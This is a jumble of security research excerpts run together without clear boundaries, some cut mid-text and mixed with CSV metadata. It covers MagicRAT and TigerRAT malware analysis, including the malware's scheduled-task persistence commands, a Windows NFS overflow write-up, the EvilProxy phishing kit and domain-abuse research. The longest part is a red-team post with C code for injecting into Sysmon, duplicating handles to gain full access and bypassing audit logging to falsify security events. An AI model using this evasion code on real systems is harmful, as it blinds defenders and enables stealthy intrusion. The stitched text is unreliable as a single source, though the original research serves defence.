Endpoint Alerts with the following titles in the security center can indicate threat activity on your network: Malware associated with DEV-0270 activity group detected The following additional alerts may also indicate activity associated with this threat.

635124cf28e9d467ce4283fa,ciscotalos,https://blog.talosintelligence.com/2022/09/lazarus-magicrat.html,MagicRAT: Lazarus’ latest gateway into victim networks,Vitor Ventura,2022-09-07,"By Jung soo An, Asheer Malhotra and Vitor Ventura . Cisco Talos has discovered a new remote access trojan (RAT) we're calling ""MagicRAT,"" developed and operated by the Lazarus APT group , which the U.S. government believes is a North Korean state-sponsored actor. Lazarus deployed MagicRAT after the successful exploitation of vulnerabilities in VMWare Horizon platforms. We've also found links between MagicRAT and another RAT known as ""TigerRAT,"" disclosed and attributed to Lazarus by the Korean Internet & Security Agency ( KISA ) recently. TigerRAT has evolved over the past year to include new functionalities that we illustrate in this blog. Executive Summary Cisco Talos has discovered a new remote access trojan (RAT), which we are calling ""MagicRAT,"" that we are attributing with moderate to high confidence to the Lazarus threat actor, a state-sponsored APT attributed to North Korea by the U.S. Cyber Security & Infrastructure Agency (CISA). This new RAT was found on victims that had been initially compromised through the exploitation of publicly exposed VMware Horizon platforms. While being a relatively simple RAT capability-wise, it was built with recourse to the Qt Framework , with the sole intent of making human analysis harder, and automated detection through machine learning and heuristics less likely. We have also found evidence to suggest that once MagicRAT is deployed on infected systems, it launches additional payloads such as custom-built port scanners. Additionally, we've found that MagicRAT's C2 infrastructure was also used to host newer variants of known Lazarus implants such as TigerRAT . The discovery of MagicRAT in the wild is an indication of Lazarus' motivations to rapidly build new, bespoke malware to use along with their previously known malware such as TigerRAT to target organizations worldwide. Actor profile Attribution Cisco Talos assesses with moderate to high confidence these attacks have been conducted by the North Korean state-sponsored threat actor Lazarus Group. This attribution is based on tactics, techniques and procedures (TTPs), malware implants and infrastructure overlap with known Lazarus campaigns. We have observed overlaps in C2 servers serving MagicRAT and previously disclosed Lazarus campaigns utilizing the Dtrack RAT family. Furthermore, Talos has also discovered C2 servers hosting and serving TigerRAT to existing MagicRAT infections. TigerRAT is a malware family attributed to the Lazarus APT groups by the Korean Internet & Security Agency ( KISA ). In some infections, we observed the deployment of MagicRAT by the attackers for some time, followed by its removal and the subsequent download and execution of another custom-developed malware called ""VSingle,"" another implant disclosed and attributed to Lazarus by JPCERT . Technical analysis MagicRAT MagicRAT is programmed in C++ programming language and uses the Qt Framework by statically linking it to the RAT on 32- and 64-bit versions. The Qt Framework is a programming library for developing graphical user interfaces, of which this RAT has none. Talos believes that the objective was to increase the complexity of the code, thus making human analysis harder. On the other hand, since there are very few examples (if any) of malware programmed with Qt Framework, this also makes machine learning and heuristic analysis detection less reliable. The 32-bit version was compiled with GCC v3.4 using mingw/cygwin for support on the Microsoft Windows platform, the 64-bit version, however, was compiled with VisualC64, version 7.14. The RAT uses the Qt classes throughout its entire code. The configuration is dynamically stored in a QSettings class eventually being saved to disk, a typical functionality provided by that class. The malware configuration (containing author-defined QSettings) is stored in the file ""visual.1991-06.com.microsoft_sd.kit"" in the path ""\ProgramData\WindowsSoftwareToolkit""- names and paths obviously chosen to trick the victim into believing they were part of the operating system. The image below shows an example of a configuration file. During our analysis, we identified three sections in the configuration file: [os] which contains the command and control (C2) URLs. [General] which holds general information. [company] which holds data used in the communication with the C2. All analyzed samples had three encoded C2 URLs that are used to register infections and then receive commands to execute on the infected endpoint. The URLs are stored in the configuration file with the keys ""windows"", ""linux"" and ""mac."" The values are prefixed with ""LR02DPt22R"" followed by the URL encoded in base64. Upon execution, MagicRAT achieves persistence for itself by executing a hardcoded command that creates scheduled tasks on the victim machine. Command Intent schtasks /create /tn ""OneDrive AutoRemove"" /tr ""C:\Windows\System32\cmd.exe /c del /f /q C:/TEMP/[MagicRAT_file_name].exe"" /sc daily /st 10:30:30 /ru SYSTEM Scheduled task starting at a specific time [ T1053/005 ] schtasks /create /tn ""Microsoft\Windows\light Service Manager"" /tr C:/TEMP/[MagicRAT_file_name].exe /sc onstart /ru SYSTEM Scheduled task starting at a different time an path [ T1053/005 ] %HOME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/OneNote.lnk Link created on startup folder [ T1547/001 ] Upon achieving persistence, the RAT contacts the C2. During the initial stages of execution, MagicRAT will perform just enough system reconnaissance to identify the system and environment in which the attackers are operating. This is done by executing the commands whoami, systeminfo and ipconfig /all. The last command has its results returned via the upload of the file zero_dump.mix to the C2. MagicRAT is rather simple — it provides the operator with a remote shell on the victim's system for arbitrary command execution, along with the ability to rename, move and delete files on the endpoint. The operator can determine the timing for the implant to sleep, change the C2 URLs and delete the implant from the infected system. We also discovered a new variant of MagicRAT in the wild generated in April 2022. This sample now consisted of the ability to delete itself from the infected endpoint using a BAT file. Additional malware One of the C2 servers used by the new MagicRAT sample, 64[.]188[.]27[.]73, hosted two more distinct implants masquerading as GIF URLs. Now, MagicRAT can make requests to its C2 and download a GIF file, which is actually an executable. Lightweight port scanner One of the GIF files discovered on the MagicRAT C2 is called ""pct.gif,"" which is an extremely simple port scanner, whose main code fits into the image below. It takes three arguments: The IP to connect to, followed by the port number and, finally, a value dictating whether the output of the port scan must be written to a log file on disk or the standard output. After a successful connection, the executable will either write the string ""Connection success!"" to the standard output or to a log file called ""Ahnupdate.log"" located in the current user's temporary directory. TigerRAT The second implant hosted on MagicRAT's C2 is a remote access trojan (RAT) known as TigerRAT . TigerRAT is an implant disclosed in 2021 by KISA and KRCERT as part of ""Operation ByteTiger'' detailing TigerRAT and its downloader ""TigerDownloader."" This implant consists of several RAT capabilities, ranging from arbitrary command execution to file management. Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version. Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe Implant capability to run arbitrary commands. Screen capture. Socks tunneling. Keylogging. File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system. The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon. One of these capabilities is called ""USB dump."" The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet. USB Dump The USB Dump capability gives the attackers the ability to: Enumerate files for path ""LOCAL_APPDATA\GDIFONTC"". Delete files. Find files of specific extensions in a specified drive and folder: .docx, .hwp, .doc, .txt, .pdf, .zip, .zoo, .arc, .lzh, .arj, .gz, .tgz. Add these files to an existing archive - in preparation for exfiltration. This is the main functionality of this new capability. The image below shows the code used to check the file extensions. Lazarus' implants commonly stitch together functionalities, including occasionally removing and adding different functions, which is evident from the latest TigerRAT samples: While Lazarus added a new capability (USB dumping and skeleton code for Webcam capture) they removed the port forwarding capability in the latest version. Older variants of TigerRAT (seen in 2020-2021) consisted of encrypted strings but the latest variant consists of strings in plaintext.

The bug is the result of a dynamically allocated buffer created by an NFS function and is present only on Windows Server 2022. An unauthenticated attacker could exploit this bug to execute arbitrary code in the context of SYSTEM. This is the third such NFS vulnerability in as many months. The following is a portion of their write-up covering CVE-2022-34715, with a few minimal modifications. A remote code execution vulnerability exists in Windows Network File System. The vulnerability is due to incorrect validation of fields within an NFS request. A remote attacker can exploit this vulnerability by sending malicious RPC calls to a target server. Successful exploitation results in arbitrary code execution in the context of SYSTEM. Unsuccessful exploitation may result in a crash of the target system. The Vulnerability Microsoft Windows ships with several network features designed to communicate and interact with non-Windows file shares. One of these modules is called Network File System (NFS). NFS is a protocol originally developed by Sun Microsystems in 1984. Version 2 is documented in RFC 1094 . Version 3 is documented in RFC 1813 . Version 4 was developed by the IETF and is documented in RFC 3010 (released December 2000) and revised in RFC 3530 (released April 2003) and RFC 7530 (released March 2015). NFS allows users to access remote file shares in the same way that the local file system is accessed. Different access levels and permissions can be set on shares, such as read-write and read-only. Additionally, IP/UID/GID/Kerberos security can be used. NFS uses Open Network Computing (ONC) Remote Procedure Call (RPC) to exchange control messages. ONC RPC was originally developed by Sun Microsystems and can also be referred to as Sun RPC . When ONC RPC messages are transferred over TCP, they are prepended with a Fragment header structure (as illustrated in the following table) that specifies the length of the message. This allows the receiver to distinguish multiple messages sent over a single TCP session. Other protocols such as UDP do not use this field. Note that all multi-byte values are encoded in big-endian byte order. The structure of ONC RPC request messages, in general, is as follows: The Credentials structure in a Sun-RPC message has the following structure: The Flavor field in the above structure serves as a type identifier of the Contents data. Security flavors have been called authentication flavors for historical reasons. There are multiple security flavors defined in the RPC specification, such as AUTH_NONE(0), AUTH_SYS(1), AUTH_SHORT(2), AUTH_DH(3), and RPCSEC_GSS(6). The Contents field for the flavor RPCSEC_GSS has the following structure: There are four types defined for the GSS Procedure field: RPCSEC_GSS_DATA(0), RPCSEC_GSS_INIT(1), RPCSEC_GSS_CONTINUE_INIT(2), and RPCSEC_GSS_DESTROY(3). Also, for the GSS Service field, there are three types: rpc_gss_svc_none(1), rpc_gss_svc_integrity(2), and rpc_gss_svc_privacy(3). When using RPCSEC_GSS to authenticate RPC clients, a security context must be created by using RPCSEC_GSS_INIT and RPCSEC_GSS_CONTINUE_INIT RPC messages. First, the RPC client sends an RPCSEC_GSS_INIT message to start the creation of the context. Then, the RPC server decides whether it needs another token for the creation. If so, the server replies with a GSS_S_CONTINUE_NEEDED message, and the client needs to send an RPCSEC_GSS_CONTINUE_INIT message to continue. If the GSS Service field is set to 2 (rpc_gss_svc_integrity), the Program-specific data field is prefixed with the following structure: If the GSS Service field is set to 3 (rpc_gss_svc_privacy), the Program-specific data field is encrypted. When the Program field is set to 100003 (NFS) and the Procedure field is set to 1 (Compound), the Program-specific data field has the following structure: In the request data, for each operation in the message: Operation data for opcode OP_CREATE(6) : Operation data for opcode OP_OPEN(18): Operation data for opcode OP_SETATTR(34): Attributes Data (fattr4) has the following format: Attributes Data for ACL ( Bit12, 0x1000 ): A buffer overflow vulnerability exists in the Windows implementation of NFS. The vulnerability is due to incorrect validation of the of the ACE_Count field when processing ACL attribute data in Nfs4SrvAclBuildWindowsAclsFromNfsAcl . This function is only vulnerable when setting ACL attribute data using opcodes 6, 18, 34. The server allocates a response buffer of size (ACE_Count << 5) . This size is stored as a uint64_t in Nfs4SrvAclBuildWindowsAclsFromNfsAcl . A buffer of this size is created using NfsMemMgrBufferAllocate . However, NfsMemMgrBufferAllocate only takes a uint32_t for the buffer size, so the upper 32 bits of the requested size is ignored. This allows an attacker to specify an ACE_Count such that (ACE_Count << 5) & 0xFFFFFFFF < ACE_Count . This will result in a buffer overflow later in the function when the buffer is used. In particular, ACE_Count values above 0x8000000 will trigger this vulnerability. Note that ACE_Count = 0x8000000 itself is not vulnerable since NfsMemMgrBufferAllocate will error when the requested length is zero. An attacker can use this vulnerability to overflow a heap buffer. Successful exploitation may result in arbitrary code execution in the context of SYSTEM. Unsuccessful exploitation will result in a crash of the target system. Source Code Walkthrough The following code snippet was taken from nfssvr.sys version 10.0.20348.825. Comments have been added by Trend Micro researchers. Detecting Attacks The detection device needs to check if the Program field in an RPC request message has the value 100003 (NFS), Procedure field has the value 1 (COMPOUND), and Program Version field has the value 4 (NFS4). If found, the device must inspect the Program-specific data in the ONC RPC messages. The detection device should check for the vulnerable opcodes (6, 18, 34) in each operation. If present the device should check the operation for ACL attribute data. If ACL attribute data is present, the device should check for an ACE_Count field above 0x8000000. There is no fixed offset into the message that can be used to ignore non-vulnerable opcodes since NFS operations do not consistently contain a length of the operation data. The full message must be processed to determine if there is any ACL attribute data. If the ACE_Count field is greater than 0x8000000, the traffic should be considered suspicious; an attack exploiting this vulnerability is likely underway. Conclusion This bug was patched by Microsoft in August 2022 and assigned CVE-2022-34715 . Their advisory lists the vulnerability as not requiring authentication. However, all known exploitation paths require file creation or modification privileges. In their write-up, they also list disabling NFSv4.1 as a method to mitigate attacks. However, this could lead to a loss of functionality. Applying the NFS-related updates is the best method to fully address the multiple NFS bugs patched in recent months.

Reverse proxies to attack multifactor authentication, such as Modlishka , have been available for several years, but EvilProxy makes it it possible to easily create and deliver advanced phishing links through a graphical user interface, Resecurity said . EvilProxy sits between a victim and the real site the user is trying to connect to, capturing their valid session cookies, to bypass the need to authenticate with user names, passwords, and / or two-factor authentication tokens, the security vendor explained. This includes accounts that have MFA enabled with short messaging text service, or application tokens. Accounts with major brands such as Apple, Facebook, GoDaddy, GitHub, Google, Dropbox, Instagram, Microsoft, Twitter, Yahoo and Yandex can be attacked with EvilProxy. Available since May this year, Resecurity said EvilProxy costs US$400 a month to rent. CyberCX executive director of security testing and assurance Adam Boileau explained to iTnews that EvilProxy cannot bypass hardware key authentication. ""U2F, FIDO, and WebAuthn are cryptographically bound to the site they are authenticating to - there is some public/private key stuff and basically the challenge that the hardware key answers is signed, such that only the real site can process the response,"" Boileau said. ""The responsibility of understanding who you're authenticating to is taken out of human hands,"" he added.

Buoyed by the proliferation of fake antivirus (FakeAV) peddlers, operators made staggering profits from the sale of rogue security software. Given the recent advancements in the cybersecurity industry and more effective anti-malware solutions and security strategies, though, how have former FakeAV adapted? WhoisXML API threat researcher Dancho Danchev sought to find out. Danchev’s in-depth analysis of 46 email addresses connected to major PPI and affiliate network business owners resulted in the discovery of: A sample of the additional artifacts obtained from our analysis is available for download from our website . Danchev began by compiling a list of email addresses known to be connected to PPI and affiliate network operators between 2008 and 2013 from open source intelligence (OSINT) sources. He amassed 47 email addresses. Using these as search terms for advanced reverse WHOIS searches led to the discovery of 109,910 domains created between 1993 and 2022. While we expected to uncover domains registered before and during the perpetrators’ operation period, it was quite interesting to note that even more web properties have been created after 2013 using the email addresses. The PPI and affiliate network operators may still have been in business after 2013. A bulk Threat Intelligence Platform (TIP) malware check for 10% of the total number of domains showed that 51 have been tagged “malicious” by various malware engines. DNS lookups for the domain artifacts revealed that they resolved to 25,101 unique IP addresses spread across 66 countries led by the U.S., Germany, Hong Kong, Canada, Australia, the Netherlands, Ireland, South Africa, China, and the U.K. Malware checks for 10% of the identified IP hosts showed that 90 of them were malicious. While a good number of these dangerous web properties are already unreachable, for sale, or led to error pages, 10 remained active, hosting live content, including gambling-related and what look to be either personal blogs or business pages. While the popularity of the PPI and affiliate network business model may have waned after 2013, their owners may still be active given that their known email addresses and the domains and IP addresses these are affiliated with remain in use. The simplest act of clicking the links identified as malware hosts could result in system infection, which could lead to operational downtime. Things get worse if users log in and lose their personally identifiable information (PII) to cybercriminals.

635124ab28e9d467ce428282,codewhite,https://codewhitesec.blogspot.com/2022/09/attacks-on-sysmon-revisited-sysmonente.html,Attacks on Sysmon Revisited - SysmonEnte,Code White,2022-09-06,"In this blogpost we demonstrate an attack on the integrity of Sysmon which generates a minimal amount of observable events making this attack difficult to detect in environments where no additional security products are installed. tl;dr: Suspend all threads of Sysmon. Create a limited handle to Sysmon and elevate it by duplication. Clone the pseudo handle of Sysmon to itself in order to bypass SACL as proposed by James Forshaw . Inject a hook manipulating all events (in particular ProcessAccess events on Sysmon). Resume all threads. We also release a POC called SysmonEnte . Background At Code White we are used to performing complex attacks against hardened and strictly monitored environments. A reasonable approach to stay under the radar of the blue team is to blend in with false positives by adapting normal process- and user behavior, carefully choosing host processes for injected tools and targeting specific user accounts. However, clients with whom we have been working for a while have reached a high level of maturity. Their security teams strictly follow all the hardening advice we give them and invest a lot of time in collecting and base-lining security related logs while constantly developing and adapting detection rules. We often see clients making heavy use of Sysmon, along with the Windows Event Logs and a traditional AV solution. For them, Sysmon is the root of trust for their security monitoring and its integrity must be ensured. However, an attacker who has successfully and covertly attacked, compromised the integrity of Sysmon and effectively breaks the security model of these clients. In order to undermine the aforementioned security-setup, we aimed at attacking Sysmon to tamper with events in a manner which is difficult to detect using Sysmon itself or the Windows Event Logs. Attacks on Sysmon and Detection Having done some Googling on how to blind Sysmon, we realized that all publicly documented ways are detectable via Sysmon itself or the Windows Event Logs (at least those we found) : Unloading Sysmon Driver - Detectable via Sysmon event id 255, Windows Security Event ID 4672. Attacks Via Custom Driver - Detectable via Sysmon event id 6, Driver loaded. Kill the Sysmon Service - Sysmon Event ID 10 (Process Access with at least PROCESS_TERMINATE flag set; The last event forwarded by Sysmon). Manipulating the Rules Registry Key - Event ID 16. Patching Sysmon in Memory - Event ID 10. While we were confident that we can kill Sysmon before throwing Event ID 5 (Process terminated) we thought that a host not sending any events would be suspicious and could be observed in a client's SIEM. Also, loading a signed, whitelisted and exploitable driver to attack from Kernel land was out of scope to maintain stability. Since all of these documented attack vectors are somehow detectable via Sysmon itself, the Windows Event Logs or can cause stability issues we needed a new attack vector with the following capabilities: Not detectable via Sysmon itself Not detectable via Windows Event Log Sysmon must stay alive Attack from usermode Injecting and manipulating the control flow of Sysmon seemed the most promising. Attack Description Similarly to SysmonQuiet or EvtMute , the idea is to inject code into Sysmon which redirects the execution flow in such a way that events can be manipulated before being forwarded to the SIEM. However, the attack must work in such a way that corresponding ProcessAccess events on Sysmon are not observable via Sysmon or the Event Log. This presents various problems, but let us first see where such a hook would be applicable. Manipulating the Execution Flow Sysmon forwards events to ETW subscribers via the documented function ntdll!EtwEventWrite . This is easily observable by setting an appropriate breakpoint. The function has the following prototype: ULONG EVNTAPI EtwEventWrite( __in REGHANDLE RegHandle, __in PCEVENT_DESCRIPTOR EventDescriptor, __in ULONG UserDataCount, __in_ecount_opt(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData ); The two most important arguments to the function are EventDescriptor and UserData . typedef struct _EVENT_DESCRIPTOR { USHORT Id; UCHAR Version; UCHAR Channel; UCHAR Level; UCHAR Opcode; USHORT Task; ULONGLONG Keyword; } EVENT_DESCRIPTOR, *PEVENT_DESCRIPTOR; The Id field of the EVENT_DESCRIPTOR determines the type of event and is important to apply the correct struct definition for the event data pointed to by PEVENT_DATA_DESCRIPTOR . The structs for the different events are obviously different for each Sysmon Event Id, as different fields and information are included. Our injected code must thus be able to apply the correct struct depending on which event is being emitted by Sysmon. But how do we know the definition of the event structs? Luckily, ETW Explorer has already documented the event definitions: A definition for the userdata struct describing a ProcessAccess event might therefore look as follows: typedef struct _ProcessAccess { wchar_t* pRuleName; size_t sizeRuleName; wchar_t* pUtcTime; size_t sizeUtcTime; void* psrcGUID; size_t sizesrcguid; void* ppidsrc; size_t sizepidsrc; void* ptidsrc; size_t sizetidsrc; wchar_t* psourceimage; size_t sizesourceimage; void* ptarGUID; size_t sizetarGUID; void* ppiddest; size_t sizepiddest; wchar_t* ptargetimage; size_t sizetargetimage; PACCESS_MASK pGrantedAccess; size_t sizeGrantedAccess; wchar_t* pCalltrace; size_t sizecalltrace; wchar_t* pSourceUser; size_t sizeSourceUser; wchar_t* pTargetUser; size_t sizetargetUser; } ProcessAccess, *PProcessAccess; We can validate this in x64dbg by setting a breakpoint at ntdll!EtwEventWrite and applying the said struct definition for a ProcessAccess event. Faking events ntdll!EtwEventWrite being responsible for forwarding events is a good place to install a hook to redirect the control flow to injected code which first manipulates the event and then forwards it: The injected code manipulating the events might look like this: //Hooked EtwEventWrite Function ULONG Hook_EtwEventWrite (REGHANDLE RegHandle, PCEVENT_DESCRIPTOR EventDescriptor, ULONG UserDataCount, PEVENT_DATA_DESCRIPTOR UserData) { //Get the address of the EtwEventWriteFull Function _EtwEventWriteFull EtwEventWriteFull = (_EtwEventWriteFull)getFunctionPtr(CRYPTED_HASH_NTDLL, CRYPTED_HASH_ETWEVENTWRITEFULL); if (EtwEventWriteFull == NULL ) { goto exit ; } //Check if it is a process access event and needs to be tampered with switch (EventDescriptor->Id) { case EVENT_PROCESSACCESS: HandleProcessAccess((PProcessAccess)UserData); break ; default : break ; } //Save the event with the EtwEventWriteFull Function EtwEventWriteFull(RegHandle, EventDescriptor, 0 , NULL , NULL , UserDataCount, UserData); exit : return 0 ; } // Make ProcessAccess events targeting Sysmon itself look benign VOID HandleProcessAccess (PProcessAccess pProcessAccess) { ACCESS_MASK access_mask_benign = 0x1400 ; PCWSTR wstr_sysmon = L""Sysmon"" ; PCWSTR wstr_ente = L""Ente"" ; //Sysmon check psysmon = StrStrIW(pProcessAccess->ptargetimage, wstr_sysmon); if (psysmon != NULL ) { //Replace the access mask with 0x1400 *pProcessAccess->pGrantedAccess = access_mask_benign; pProcessAccess->sizeGrantedAccess = sizeof (access_mask_benign); //Replace the Source User with Ente lstrcpyW(pProcessAccess->pSourceUser, wstr_ente); pProcessAccess->sizeSourceUser = sizeof (wstr_ente); } } Note, how ntdll!EtwEventWriteFull is used to forward every event. Since we know where to inject the hook and what the UserData structs look like, we are now able to tamper with every Sysmon event before it is forwarded. However, the injection into Sysmon remains observable and the corresponding ProcessAccess event is the last event we do not control. Detection of Process Manipulation OpenProcess Access event In order to create a handle to Sysmon which allows us to conduct process injection of any kind, we need to open Sysmon with at least the following access mask: PROCESS_VM_OPERATION | PROCESS_VM_WRITE . As Sysmon has not yet been modified while we open this handle, a suspicious ProcessAccess Event is generated which is an IOC defenders could hunt for: Handle Elevation Playing with kernel32!DuplicateHandle for another project , we noticed that MSDN states something very interesting: In some cases, the new handle can have more access rights than the original handle. Thus, by first creating a handle with a very limited access mask and then duplicating this handle with a new access mask, we technically do not create a new handle with a high access mask. HANDLE hSysmon = NULL ; HANDLE hhighpriv = NULL ; BOOL bsuccess = FALSE; hSysmon = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 3340 ); bsuccess = DuplicateHandle(GetCurrentProcess(), hSysmon, GetCurrentProcess(), &hhighpriv, PROCESS_ALL_ACCESS, FALSE, 0 ); Sysmon, (to the best of our knowledge) only using OB_OPERATION_HANDLE_CREATE , only sees the benign access mask, but not the duplication of the handle with a higher access mask: Using handle elevation we can gain handles with arbitrary process access masks to arbitrary (non-ppl) processes while Sysmon only logs the instantiation of the original handle. Great Success! Unfortunately, there are some problems: This only works if the targeted process runs as the same user as the duplicating process. This can be easily circumvented by stealing a token from a System process. We steal the token from an elevated svchost process running as System by only using a PROCESS_QUERY_LIMITED_INFORMATION mask, where we do not need the SE_DEBUG privilege which is often used in detection rules. System Access Control Lists (SACL) . This is a bigger problem Detection via System Access Control Lists (SACL) Unfortunately, it is still possible to observe the duplication of the handle by configuring Object Access Auditing using a SACL on Sysmon. The following screenshot shows how ProcessHacker is leveraged to configure the SACL: With this SACL, event 4656 is generated by the Windows Event Log Service upon creation of a handle to Sysmon allowing to write in its memory. This event is also emitted, if handle elevation is used . Note: In the default config, Object Access Auditing is not enabled. SACL Bypass by James Forshaw Fortunately for us, James Forshaw published a great blogpost on how to evade SACL . According to the post, we can duplicate the pseudo handle of a different process to itself to get full access to the process without triggering Object Access Auditing. A stealthy way to gain a handle suitable for process injection would be the following: Open a process handle to Sysmon with a very limited access mask (A detection rule based on this would generate too many false positives) Elevate this handle using ntdll!DuplicateObject to hold the PROCESS_DUP_HANDLE right (Bypasses Sysmon's telemetry) Use the elevated handle to duplicate the pseudo Handle of Sysmon (Bypasses SACL). uPid.UniqueProcess = dwPid; uPid.UniqueThread = 0 ; ntStatus = NtOpenProcess(&hlowpriv, PROCESS_QUERY_LIMITED_INFORMATION, &ObjectAttributes, &uPid); if (!NT_SUCCESS(ntStatus)) FATAL( ""[-] Failed to open low priv handle to sysmon\n"" ); ntStatus = NtDuplicateObject(NtCurrentProcess(), hlowpriv, NtCurrentProcess(), &hduppriv, PROCESS_DUP_HANDLE, FALSE, 0 ); if (!NT_SUCCESS(ntStatus)) FATAL( ""[-] Failed to elevate to handle with PROCESS_DUP_HANDLE rights\n"" ); ntStatus = NtDuplicateObject(hduppriv, NtCurrentProcess(), NtCurrentProcess(), &hhighpriv, PROCESS_ALL_ACCESS, FALSE, 0 ); if (!NT_SUCCESS(ntStatus)) FATAL( ""[-] Failed to elevate to handle with PROCESS_ALL_ACCESS rights\n"" ); Doing so we gain a full access handle to Sysmon while bypassing Sysmon's telemetry and SACL . Fine Tuning There was one last IOC we could come up with. Sysmon can only observe the creation of a limited handle to itself, however, following the golden rule of never touching disk, our tool being unpacked or injected into another process will have a broken calltrace containing unknown sections. Since Sysmon has not been tampered with at this point, this would be the last event which we do not have under control and might be sufficient to create a detection rule upon! We can delay the forwarding of this event by suspending all threads of Sysmon. The events are then queued and dispatched only after we resume the threads, giving us enough time to install a hook manipulating all ProcessAccess events on Sysmon itself. This is possible, because no events for accessing, suspending or resuming a thread exist in Sysmon. The hook then necessarily spoofs the callstack included in the ProcessAccess event. Putting It All Together We combined all of these steps into a tool we call SysmonEnte which you can find on our Github . SysmonEnte is implemented as fully position independent code (PIC) which can be called using the following prototype: DWORD go (DWORD dwPidSysmon) ; A sample loader is included and built during compilation when typing make . Additionally, SysmonEnte uses indirect syscalls to bypass userland hooks while injecting into Sysmon. The open source variant tampers with process access events to Lsass and Sysmon and sets the access mask to a benign one. Additionally, the source user and the callstack is set to Ente . You can change these to your needs. Possible Detection Methods Certain detection ideas exist from our point of view: ETW TI The easiest solution would be to subscribe to the Threat Intelligence ETW provider to observe injections or suspicious code manipulations. This however requires a signed ELAM driver. Kernel Callbacks If you have the possibility to run as a kernel driver you can probably implement the callback for the OB_OPERATION_HANDLE_DUPLICATE to monitor for Object Access Auditing Bypasses. https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_ob_operation_registration Object Access Auditing If you have the possibility to enable Object Access Auditing, you can configure a SACL for Sysmon to monitor the duplication of handles to catch the SACL bypass used to gain a handle to Sysmon. We are not sure about false positives in large environments though. To the best of our knowledge, and in contrast to SACLs for filesystem- or registry operations, configuring Object Access Auditing on processes is only achievable by writing a custom program. This circumstance makes the detection of handle duplication via SACL non-trivial. A sample program is included on our Github and configures a SACL with ACCESS_SYSTEM_SECURITY + PROCESS_DUP_HANDLE + PROCESS_VM_OPERATION and is applied to the group Everyone . ACCESS_SYSTEM_SECURITY is included as otherwise, attackers can covertly change the SACL. With this configuration, attempts to duplicate a handle to Sysmon should become visible. Note: Object Access Auditing is not enabled by default and must be enabled via Group Policy prior the use of the tool. Final Words Sysmon on it's own is not able to protect itself sufficiently, and it is difficult to observe the described attack with the event log. We believe that running Sysmon alone, without any protection from a trusted third party tool sitting in kernel land or running as a PPL, is not guaranteed to produce reliable logs with ensured integrity. A possible fix by Microsoft would be to allow running Sysmon as a PPL. It is noteworthy that the described technique of handle elevation + SACL bypass can also be used to stealthily dump Lsass. After our talk at X33fcon , nanodump supports handle elevation as well. However, a SACL with PROCESS_VM_READ is configured for Lsass by default. ;-) References https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon https://github.com/matterpreter/Shhmon https://github.com/bats3c/Ghost-In-The-Logs https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing https://www.tiraniddo.dev/2017/10/bypassing-sacl-auditing-on-lsass.html https://docs.microsoft.com/en-us/windows-hardware/test/weg/instrumenting-your-code-with-etw https://github.com/ScriptIdiot/SysmonQuiet https://github.com/bats3c/EvtMute",[],798d7dfb-bf59-58d5-ac93-e49f184e755a,"In this blogpost we demonstrate an attack on the integrity of Sysmon which generates a minimal amount of observable events making this attack difficult to detect in environments where no additional security products are installed.

While he used e-commerce sites as sales channels, the idea that counterfeit products are also peddled through cybersquatting domains is not too far-fetched. In fact, we demonstrated this at Europol’s 13th Operation In Our Sites (IOS), along with other organizations in the cybersecurity community. Aside from counterfeiting, cybersquatting domains can also serve as vehicles for other types of cybercrime, such as spear phishing, scams, and spamming. In line with that, WhoisXML API researchers monitored the Domain Name System (DNS) for cybersquatting domains targeting Cisco and its major competitors—Avaya, Broadcom, Juniper Networks, and Netgear. Our findings include: A sample of the additional artifacts obtained from our analysis is available for download from our website . We used the company names as search strings to retrieve relevant properties using Domains & Subdomains Discovery . To lessen the number of false positives, we added restrictions, such as excluding domains that contained the string “francisco” for Cisco cyber resources. We found 2,797 cybersquatting properties added from 1 June to 8 August 2022. We then analyzed these resources using IP, WHOIS, and other DNS intelligence tools. Before proceeding with any other analyses, we thought it’d be interesting to establish attribution for the properties. Does the targeted company own them? Based on the Bulk WHOIS Lookup results, the cybersquatting properties could hardly be attributed to the network hardware providers. In particular, only eight domains shared the same publicly available registrant details as the official domains of the companies, and they were all owned by Cisco. About 85% of the non-publicly attributable domains actively resolved to 1,400+ unique IP addresses. More than 60% of the properties resolved to IP addresses geolocated in the U.S., while the rest were distributed across 49 other countries. The locations didn’t differ much from the registrant countries of most of the domains. About 46% of them were registered in the U.S. as well, and the remaining domains were registered across 47 other countries. The table below shows the top 10 countries in terms of IP geolocation and WHOIS registration, along with the percentage of properties attributed to them. Part of our study was to find out who had authority over the properties. For the domains, that would be GoDaddy, since it is the top registrar of the cybersquatting resources, accounting for 16% of the registrations. It was followed by MarkMonitor, Namecheap, Network Solutions, Info.at Google, Amazon, PDR Ltd., 123-Reg Limited, and Wix. The rest were distributed across 154 other registrars. Most of the cybersquatting domains in the study (19%) resolved to IP addresses belonging to Amazon. Google accounted for 10%, followed by Cloudflare, Microsoft, Fastly, OVH, Linode, Hetzner, Digital Ocean, and Wix. More than a dozen cybersquatting resources have been reported as malicious since 8 August 2022. Among them is netgearextendersetups[.]com, which resolved to 190[.]115[.]26[.]62. Five other similar-looking cybersquatting domains also resolved to the same IP address but haven’t been flagged yet. These are: Aside from resolving to the same IP address, these domains also shared the same registrar and nameserver. The rest of their WHOIS details were redacted, except for netgearwifiextendersetup[.]us. We retrieved a public email address that was historically tied to 17 suspicious-looking domains, according to Reverse WHOIS Search . Some seemed to mimic the login pages of router and entertainment sites. These are shown in the screenshot below. Only time can tell if they will also be weaponized, but keeping an eye on them and other cybersquatting properties could be a good cybersecurity practice. We began with cybersquatting properties, some of which could be benign. Still, a deep dive into the malicious ones led us to more suspicious properties that could harm users and their networks. The suspicious properties we uncovered in this post can be used to sell fake network devices. They can also be weaponized to serve as phishing, scam, and malware distribution vectors.

